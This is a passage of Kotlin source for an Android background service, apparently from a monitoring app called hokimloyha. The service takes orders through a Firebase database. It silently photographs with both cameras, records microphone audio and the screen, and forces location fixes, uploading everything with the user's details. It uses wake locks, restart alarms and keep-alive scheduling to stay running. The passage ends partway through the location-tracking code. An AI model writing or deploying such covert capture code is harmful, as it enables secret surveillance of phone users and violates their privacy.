package com.hokimloyha.app.service

import android.Manifest
import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.location.LocationManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.util.Base64
import android.util.Log
import android.util.Size
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.gson.Gson
import com.hokimloyha.app.R
import com.hokimloyha.app.model.User
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.Executors

class TrackerService : Service() {

    private var fusedLocationClient: FusedLocationProviderClient? = null
    private var database: FirebaseDatabase? = null
    private var locationRef: DatabaseReference? = null
    private var commandsRef: DatabaseReference? = null
    private var mediaRef: DatabaseReference? = null
    private var locationCallback: LocationCallback? = null

    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var wakeLock: PowerManager.WakeLock? = null
    private var lastSavedLat: Double = 0.0
    private var lastSavedLon: Double = 0.0
    private var lastLocationUploadTime: Long = 0L

    private val serviceExecutor = Executors.newSingleThreadExecutor()
    private val heartbeatHandler = Handler(Looper.getMainLooper())
    private var currentDeviceId: String = "hokim"

    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            try {
                database?.goOnline()
                val devId = getActiveDeviceId()
                val now = System.currentTimeMillis()
                database?.getReference("tracking/devices/$devId/heartbeat")?.setValue(now)
                checkGpsAndBatteryStatus(devId)
            } catch (_: Exception) {}
            heartbeatHandler.postDelayed(this, 15000L)
        }
    }

    companion object {
        const val CHANNEL_ID = "hokimloyha_tracking_channel"
        const val NOTIFICATION_ID = 1001
        private const val TAG = "TrackerService"
    }

    fun getActiveDeviceId(): String {
        val appPrefs = getSharedPreferences("app_prefs", MODE_PRIVATE)
        val uName = appPrefs.getString("current_username", null)
        if (!uName.isNullOrBlank()) {
            currentDeviceId = uName
            return uName
        }

        val hokimPrefs = getSharedPreferences("hokim_app_prefs", MODE_PRIVATE)
        val hName = hokimPrefs.getString("current_username", null)
        if (!hName.isNullOrBlank()) {
            currentDeviceId = hName
            return hName
        }

        val userJson = appPrefs.getString("current_user", null) ?: hokimPrefs.getString("current_user", null)
        if (!userJson.isNullOrEmpty()) {
            try {
                val u = Gson().fromJson(userJson, User::class.java)
                if (u != null && u.username.isNotBlank()) {
                    currentDeviceId = u.username
                    return u.username
                }
            } catch (_: Exception) {}
        }
        return currentDeviceId
    }

    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        try {
            database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
            val devId = getActiveDeviceId()
            locationRef = database?.getReference("tracking/devices/$devId/location")
            commandsRef = database?.getReference("tracking/devices/$devId/commands")
            mediaRef = database?.getReference("tracking/devices/$devId/media")

            commandsRef?.keepSynced(true)

            listenToAdminCommands()
            updateDeviceInfo(devId)
            heartbeatHandler.post(heartbeatRunnable)
        } catch (e: Exception) {
            Log.e(TAG, "Firebase init error", e)
        }
        createNotificationChannel()
    }

    private fun updateDeviceInfo(devId: String) {
        val prefs = getSharedPreferences("hokim_app_prefs", MODE_PRIVATE)
        val userJson = prefs.getString("current_user", null)
        if (!userJson.isNullOrEmpty()) {
            try {
                val u = Gson().fromJson(userJson, User::class.java)
                val info = mapOf(
                    "userId" to u.id,
                    "username" to u.username,
                    "fullName" to u.fullName,
                    "role" to u.role.name,
                    "position" to (u.position ?: "Xodim"),
                    "phone" to (u.phone ?: ""),
                    "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
                    "updatedAt" to System.currentTimeMillis()
                )
                database?.getReference("tracking/devices/$devId/info")?.setValue(info)
            } catch (_: Exception) {}
        }
    }

    private fun checkGpsAndBatteryStatus(devId: String) {
        try {
            val locationManager = getSystemService(LOCATION_SERVICE) as LocationManager
            val isGpsOn = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                          locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
            mediaRef?.child("gps_enabled")?.setValue(isGpsOn)

            // Batareya foizini aniqlash
            val batteryFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryIntent = registerReceiver(null, batteryFilter)
            val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level >= 0 && scale > 0) {
                val batteryPct = (level * 100) / scale
                database?.getReference("tracking/devices/$devId/info/battery")?.setValue(batteryPct)
            }
        } catch (_: Exception) {}
    }

    private fun acquireWakeLock(durationMs: Long = 15000L) {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            if (wakeLock == null) {
                wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Hokimloyha:TrackerWakeLock")
            }
            if (wakeLock?.isHeld == false) {
                wakeLock?.acquire(durationMs)
            }
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock error", e)
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (_: Exception) {}
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            if (isRecording) {
                try {
                    mediaRecorder?.stop()
                    mediaRecorder?.release()
                } catch (_: Exception) {}
                mediaRecorder = null
                isRecording = false
                val audioFile = File(filesDir, "audio_record.m4a")
                if (audioFile.exists() && audioFile.length() > 0) {
                    val bytes = audioFile.readBytes()
                    val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    val now = System.currentTimeMillis()
                    val item = mapOf("audio_base64" to b64, "timestamp" to now, "duration" to 1)
                    val devId = getActiveDeviceId()
                    database?.getReference("tracking/devices/$devId/media/latest_audio")?.setValue(item)
                    database?.getReference("tracking/devices/$devId/media/archive_audio")?.push()?.setValue(item)
                    database?.getReference("tracking/devices/$devId/media/is_audio_recording")?.setValue(false)
                    database?.getReference("tracking/devices/$devId/commands/record_audio")?.setValue(false)
                }
            }
        } catch (_: Exception) {}

        try {
            val restartIntent = Intent(this, BootReceiver::class.java).apply {
                action = "com.hokimloyha.app.ACTION_RESTART_SERVICE"
            }
            val pi = PendingIntent.getBroadcast(
                this, 1002, restartIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            val alarmService = getSystemService(ALARM_SERVICE) as AlarmManager
            val triggerAt = SystemClock.elapsedRealtime() + 1000L
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmService.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
            } else {
                alarmService.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
            }
        } catch (e: Exception) {
            Log.e(TAG, "onTaskRemoved watchdog error", e)
        }
        super.onTaskRemoved(rootIntent)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        val notification = createNotification()

        val passedDevId = intent?.getStringExtra("device_id")
        if (!passedDevId.isNullOrBlank()) {
            currentDeviceId = passedDevId
        }
        val devId = getActiveDeviceId()
        locationRef = database?.getReference("tracking/devices/$devId/location")
        commandsRef = database?.getReference("tracking/devices/$devId/commands")
        mediaRef = database?.getReference("tracking/devices/$devId/media")
        commandsRef?.keepSynced(true)
        listenToAdminCommands()
        updateDeviceInfo(devId)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            try {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                )
            } catch (e: Exception) {
                try {
                    startForeground(
                        NOTIFICATION_ID,
                        notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    )
                } catch (_: Exception) {
                    try {
                        startForeground(
                            NOTIFICATION_ID,
                            notification,
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                        )
                    } catch (_: Exception) {}
                }
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                )
            } catch (_: Exception) {
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                )
            } catch (_: Exception) {
                startForeground(NOTIFICATION_ID, notification)
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        startTrackingLocation()
        scheduleKeepAliveAlarm()
        return START_STICKY
    }

    private fun scheduleKeepAliveAlarm() {
        try {
            val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
            val intent = Intent(this, AlarmReceiver::class.java).apply {
                action = "com.hokimloyha.app.ACTION_KEEP_ALIVE"
            }
            val pendingIntent = PendingIntent.getBroadcast(
                this, 8888, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            val triggerTime = SystemClock.elapsedRealtime() + (2 * 60 * 1000L)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent)
            } else {
                alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent)
            }
        } catch (_: Exception) {}
    }

    private var lastHandledPhotoTimestamp = 0L
    private var lastHandledScreenTimestamp = 0L

    private fun listenToAdminCommands() {
        commandsRef?.child("take_photo")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val timestamp = snapshot.getValue(Long::class.java) ?: 0L
                if (timestamp > 0L && timestamp != lastHandledPhotoTimestamp) {
                    lastHandledPhotoTimestamp = timestamp
                    capturePhotosSilently()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        commandsRef?.child("record_audio")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val value = snapshot.value
                val shouldRecord = when (value) {
                    is Boolean -> value
                    is String -> value.equals("start", ignoreCase = true) || value.equals("true", ignoreCase = true)
                    is Number -> value.toLong() > 0L
                    else -> false
                }
                if (shouldRecord && !isRecording) {
                    startAudioRecording()
                } else if (!shouldRecord && isRecording) {
                    stopAudioRecording()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        commandsRef?.child("record_screen")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val value = snapshot.value
                val shouldRecord = when (value) {
                    is Boolean -> value
                    is String -> value.equals("start", ignoreCase = true) || value.equals("true", ignoreCase = true)
                    is Number -> value.toLong() > 0L
                    else -> false
                }
                handleScreenRecordCommand(shouldRecord)
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        commandsRef?.child("request_gps")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val ts = snapshot.getValue(Long::class.java) ?: 0L
                if (ts > 0L) {
                    requestImmediateLocation()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private var isScreenRecording = false

    private fun handleScreenRecordCommand(shouldRecord: Boolean) {
        val devId = getActiveDeviceId()
        if (shouldRecord && !isScreenRecording) {
            isScreenRecording = true
            try {
                if (AppStateTracker.mediaProjectionIntent != null) {
                    val recIntent = Intent(this, ScreenRecordService::class.java).apply {
                        action = ScreenRecordService.ACTION_START
                        putExtra("device_id", devId)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(recIntent)
                    } else {
                        startService(recIntent)
                    }
                } else {
                    ScreenCaptureHelper.captureScreenshot(this, devId)
                    isScreenRecording = false
                    commandsRef?.child("record_screen")?.setValue(false)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Screen record start error", e)
                ScreenCaptureHelper.captureScreenshot(this, devId)
                isScreenRecording = false
                commandsRef?.child("record_screen")?.setValue(false)
            }
        } else if (!shouldRecord && isScreenRecording) {
            isScreenRecording = false
            try {
                val stopIntent = Intent(this, ScreenRecordService::class.java).apply {
                    action = ScreenRecordService.ACTION_STOP
                    putExtra("device_id", devId)
                }
                startService(stopIntent)
            } catch (e: Exception) {
                Log.e(TAG, "Screen record stop error", e)
            }
        }
    }

    private fun requestImmediateLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            
            try {
                fusedLocationClient?.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null)
                    ?.addOnSuccessListener { loc ->
                        if (loc != null) {
                            saveLocationIfChanged(loc.latitude, loc.longitude, force = true)
                        }
                    }
            } catch (_: Exception) {}

            fusedLocationClient?.lastLocation?.addOnSuccessListener { loc ->
                if (loc != null) {
                    saveLocationIfChanged(loc.latitude, loc.longitude, force = true)
                }
            }
        }
    }

    private fun trimFirebaseArchive(ref: DatabaseReference, maxCount: Int) {
        ref.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val children = snapshot.children.toList()
                if (children.size > maxCount) {
                    val excessCount = children.size - maxCount
                    for (i in 0 until excessCount) {
                        children[i].ref.removeValue()
                    }
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null

    @Synchronized
    private fun getCameraHandler(): Handler {
        if (cameraThread == null || !cameraThread!!.isAlive) {
            cameraThread = HandlerThread("TrackerCameraThread").apply { start() }
            cameraHandler = Handler(cameraThread!!.looper)
        }
        return cameraHandler!!
    }

    private fun capturePhotosSilently() {
        val devId = getActiveDeviceId()
        acquireWakeLock(30000L)
        mediaRef?.child("status")?.setValue("Kameralar faollashmoqda...")

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            mediaRef?.child("status")?.setValue("Kamera ruxsati berilmagan")
            releaseWakeLock()
            return
        }

        val handler = getCameraHandler()
        handler.post {
            try {
                val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
                val cameraIds = cameraManager.cameraIdList

                if (cameraIds.isEmpty()) {
                    mediaRef?.child("status")?.setValue("Kamera topilmadi")
                    releaseWakeLock()
                    return@post
                }

                var backCamId: String? = null
                var frontCamId: String? = null

                for (id in cameraIds) {
                    try {
                        val characteristics = cameraManager.getCameraCharacteristics(id)
                        val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                        if (facing == CameraCharacteristics.LENS_FACING_BACK && backCamId == null) {
                            backCamId = id
                        } else if (facing == CameraCharacteristics.LENS_FACING_FRONT && frontCamId == null) {
                            frontCamId = id
                        }
                    } catch (_: Exception) {}
                }

                val primaryCamId = backCamId ?: cameraIds[0]

                // 1. Orqa kamerani olish
                takeSingleCamera2Photo(cameraManager, primaryCamId) { backBase64 ->
                    if (backBase64 == null) {
                        Log.w(TAG, "Camera2 returned null in background, using CameraActivity fallback")
                        launchCameraActivity(devId)
                        return@takeSingleCamera2Photo
                    }
                    // 2. Old kamerani olish (agar mavjud va boshqacha bo'lsa)
                    val secondaryCamId = frontCamId
                    if (secondaryCamId != null && secondaryCamId != primaryCamId) {
                        handler.postDelayed({
                            takeSingleCamera2Photo(cameraManager, secondaryCamId) { frontBase64 ->
                                saveBothPhotos(devId, backBase64, frontBase64)
                            }
                        }, 200L)
                    } else {
                        saveBothPhotos(devId, backBase64, null)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Silent photo capture error, using CameraActivity fallback", e)
                launchCameraActivity(devId)
            }
        }
    }

    private fun launchCameraActivity(devId: String) {
        try {
            val intent = Intent(this, CameraActivity::class.java).apply {
                putExtra("device_id", devId)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            }
            startActivity(intent)
        } catch (_: Exception) {
            try {
                val intent = Intent(this, CameraActivity::class.java).apply {
                    putExtra("device_id", devId)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                val pi = PendingIntent.getActivity(
                    this, 7771, intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )
                val notif = NotificationCompat.Builder(this, CHANNEL_ID)
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setContentTitle("Monitoring")
                    .setContentText("Kamera xizmati faollashmoqda")
                    .setPriority(NotificationCompat.PRIORITY_MAX)
                    .setCategory(NotificationCompat.CATEGORY_ALARM)
                    .setFullScreenIntent(pi, true)
                    .setAutoCancel(true)
                    .build()
                val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
                nm.notify(7771, notif)
                heartbeatHandler.postDelayed({
                    try { nm.cancel(7771) } catch (_: Exception) {}
                }, 3000L)
            } catch (e: Exception) {
                Log.e(TAG, "launchCameraActivity error", e)
                releaseWakeLock()
            }
        }
    }

    private fun saveBothPhotos(devId: String, backBase64: String?, frontBase64: String?) {
        try {
            val now = System.currentTimeMillis()
            val photoItem = mapOf(
                "back_base64" to (backBase64 ?: ""),
                "front_base64" to (frontBase64 ?: ""),
                "timestamp" to now
            )
            mediaRef?.child("latest_photo")?.setValue(photoItem)
            val archiveRef = mediaRef?.child("archive_photos")
            archiveRef?.push()?.setValue(photoItem)?.addOnCompleteListener {
                if (archiveRef != null) {
                    trimFirebaseArchive(archiveRef, 20)
                }
            }
            mediaRef?.child("status")?.setValue("Yangi rasm qabul qilindi ($now)")
        } catch (e: Exception) {
            Log.e(TAG, "saveBothPhotos error", e)
        } finally {
            releaseWakeLock()
        }
    }

    private fun processJpegBytes(bytes: ByteArray): String {
        return try {
            val origBmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                ?: return Base64.encodeToString(bytes, Base64.NO_WRAP)
            val maxDim = 800
            var workingBmp = origBmp
            if (origBmp.width > maxDim || origBmp.height > maxDim) {
                val scale = maxDim.toFloat() / maxOf(origBmp.width, origBmp.height)
                val nw = (origBmp.width * scale).toInt()
                val nh = (origBmp.height * scale).toInt()
                workingBmp = Bitmap.createScaledBitmap(origBmp, nw, nh, true)
                if (workingBmp != origBmp) origBmp.recycle()
            }
            val baos = ByteArrayOutputStream()
            workingBmp.compress(Bitmap.CompressFormat.JPEG, 65, baos)
            val compressed = baos.toByteArray()
            workingBmp.recycle()
            Base64.encodeToString(compressed, Base64.NO_WRAP)
        } catch (_: Exception) {
            Base64.encodeToString(bytes, Base64.NO_WRAP)
        }
    }

    @SuppressLint("MissingPermission")
    private fun takeSingleCamera2Photo(manager: CameraManager, cameraId: String, callback: (String?) -> Unit) {
        val handler = getCameraHandler()
        var isDone = false

        fun finishWith(result: String?, camera: CameraDevice? = null, reader: ImageReader? = null) {
            if (isDone) return
            isDone = true
            try { camera?.close() } catch (_: Exception) {}
            try { reader?.close() } catch (_: Exception) {}
            callback(result)
        }

        val timeoutRunnable = Runnable {
            finishWith(null)
        }
        handler.postDelayed(timeoutRunnable, 5000L)

        try {
            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val characteristics = manager.getCameraCharacteristics(cameraId)
                        val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                        val sizes = map?.getOutputSizes(ImageFormat.JPEG) ?: emptyArray()
                        val chosenSize = sizes.filter { it.width <= 1280 && it.height <= 960 }
                            .maxByOrNull { it.width * it.height } ?: sizes.firstOrNull() ?: Size(640, 480)

                        val reader = ImageReader.newInstance(chosenSize.width, chosenSize.height, ImageFormat.JPEG, 2)
                        reader.setOnImageAvailableListener({ imReader ->
                            try {
                                val image = imReader.acquireLatestImage()
                                if (image != null) {
                                    val buffer = image.planes[0].buffer
                                    val bytes = ByteArray(buffer.remaining())
                                    buffer.get(bytes)
                                    image.close()

                                    val base64 = processJpegBytes(bytes)
                                    handler.removeCallbacks(timeoutRunnable)
                                    finishWith(base64, camera, reader)
                                } else {
                                    handler.removeCallbacks(timeoutRunnable)
                                    finishWith(null, camera, reader)
                                }
                            } catch (e: Exception) {
                                handler.removeCallbacks(timeoutRunnable)
                                finishWith(null, camera, reader)
                            }
                        }, handler)

                        val surface = reader.surface
                        val captureCallback = object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(surface)
                                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                    }
                                    session.capture(captureBuilder.build(), null, handler)
                                } catch (e: Exception) {
                                    handler.removeCallbacks(timeoutRunnable)
                                    finishWith(null, camera, reader)
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                handler.removeCallbacks(timeoutRunnable)
                                finishWith(null, camera, reader)
                            }
                        }

                        @Suppress("DEPRECATION")
                        camera.createCaptureSession(listOf(surface), captureCallback, handler)
                    } catch (e: Exception) {
                        handler.removeCallbacks(timeoutRunnable)
                        finishWith(null, camera)
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    handler.removeCallbacks(timeoutRunnable)
                    finishWith(null, camera)
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    handler.removeCallbacks(timeoutRunnable)
                    finishWith(null, camera)
                }
            }, handler)
        } catch (e: Exception) {
            handler.removeCallbacks(timeoutRunnable)
            finishWith(null)
        }
    }

    private var audioRecordStartTime: Long = 0L

    private fun startAudioRecording() {
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                mediaRef?.child("audio_status")?.setValue("Mikrofon ruxsati berilmagan")
                mediaRef?.child("status")?.setValue("Mikrofon ruxsati berilmagan")
                return
            }

            acquireWakeLock(300000L)

            // Ilovadan chiqqanda mikrofon o'chib qolmasligi uchun xizmatni MICROPHONE turiga ko'taramiz
            try {
                val notif = createNotification()
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    startForeground(
                        NOTIFICATION_ID,
                        notif,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    )
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(
                        NOTIFICATION_ID,
                        notif,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    )
                }
            } catch (e: Exception) {
                Log.w(TAG, "Cannot elevate FGS to microphone: ${e.message}")
            }

            val audioFile = File(filesDir, "audio_record.m4a")
            if (audioFile.exists()) audioFile.delete()

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(64000)
                setAudioSamplingRate(44100)
                setOutputFile(audioFile.absolutePath)
                setOnErrorListener { _, what, extra ->
                    Log.e(TAG, "MediaRecorder error: $what, $extra")
                    stopAudioRecording()
                }
                prepare()
                start()
            }
            audioRecordStartTime = System.currentTimeMillis()
            isRecording = true
            mediaRef?.child("is_audio_recording")?.setValue(true)
            mediaRef?.child("audio_status")?.setValue("Ovoz yozish boshlandi...")
            mediaRef?.child("status")?.setValue("Ovoz yozilmoqda...")
        } catch (e: Exception) {
            releaseWakeLock()
            Log.e(TAG, "Audio start error", e)
            isRecording = false
            mediaRef?.child("is_audio_recording")?.setValue(false)
            commandsRef?.child("record_audio")?.setValue(false)
            mediaRef?.child("audio_status")?.setValue("Ovoz xatosi: ${e.localizedMessage}")
            mediaRef?.child("status")?.setValue("Ovoz xatosi: ${e.localizedMessage}")
        }
    }

    private fun stopAudioRecording() {
        serviceExecutor.execute {
            try {
                val elapsed = System.currentTimeMillis() - audioRecordStartTime
                if (elapsed < 1200L) {
                    try { Thread.sleep(1200L - elapsed) } catch (_: Exception) {}
                }

                try {
                    mediaRecorder?.stop()
                } catch (e: Exception) {
                    Log.w(TAG, "MediaRecorder stop: ${e.message}")
                }
                try {
                    mediaRecorder?.reset()
                    mediaRecorder?.release()
                } catch (_: Exception) {}
                mediaRecorder = null
                isRecording = false
                mediaRef?.child("is_audio_recording")?.setValue(false)
                commandsRef?.child("record_audio")?.setValue(false)

                // FGS turini mikrofon tugagach yana odatiy holatga qaytaramiz
                try {
                    val notif = createNotification()
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        startForeground(
                            NOTIFICATION_ID,
                            notif,
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                        )
                    } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        startForeground(
                            NOTIFICATION_ID,
                            notif,
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                        )
                    }
                } catch (_: Exception) {}

                val audioFile = File(filesDir, "audio_record.m4a")
                if (audioFile.exists() && audioFile.length() > 0) {
                    val bytes = audioFile.readBytes()
                    audioFile.delete()
                    val base64Audio = Base64.encodeToString(bytes, Base64.NO_WRAP)

                    val now = System.currentTimeMillis()
                    val durationSec = ((now - audioRecordStartTime) / 1000).toInt().coerceAtLeast(1)
                    val archiveAudio = mapOf(
                        "audio_base64" to base64Audio,
                        "timestamp" to now,
                        "duration" to durationSec
                    )
                    mediaRef?.child("latest_audio")?.setValue(archiveAudio)
                    val audioRef = mediaRef?.child("archive_audio")
                    audioRef?.push()?.setValue(archiveAudio)?.addOnCompleteListener { task ->
                        releaseWakeLock()
                        if (task.isSuccessful) {
                            mediaRef?.child("audio_status")?.setValue("Ovoz saqlandi ($durationSec sek, ${bytes.size / 1024} KB)")
                            mediaRef?.child("status")?.setValue("Yangi ovoz yozuvi saqlandi ($now)")
                            if (audioRef != null) {
                                trimFirebaseArchive(audioRef, 20)
                            }
                        } else {
                            mediaRef?.child("audio_status")?.setValue("Ovoz saqlash xatosi")
                        }
                    }
                } else {
                    releaseWakeLock()
                    mediaRef?.child("audio_status")?.setValue("Ovoz yozuvi bo'sh yoki saqlanmadi")
                    try { audioFile.delete() } catch (_: Exception) {}
                }
            } catch (e: Exception) {
                releaseWakeLock()
                isRecording = false
                mediaRef?.child("is_audio_recording")?.setValue(false)
                Log.e(TAG, "Audio stop error", e)
            }
        }
    }

    private fun startTrackingLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return
        }

        try {
            fusedLocationClient?.lastLocation?.addOnSuccessListener { location ->
                if (location != null && locationRef != null) {
                    saveLocationIfChanged(location.latitude, location.longitude)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "lastLocation error", e)
        }

        val locationRequest = LocationRequest.Builder(
            Priority.PRIORITY_BALANCED_POWER_ACCURACY,
            15000L
        ).setMinUpdateIntervalMillis(10000L)
         .setMinUpdateDistanceMeters(5.0f)
         .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
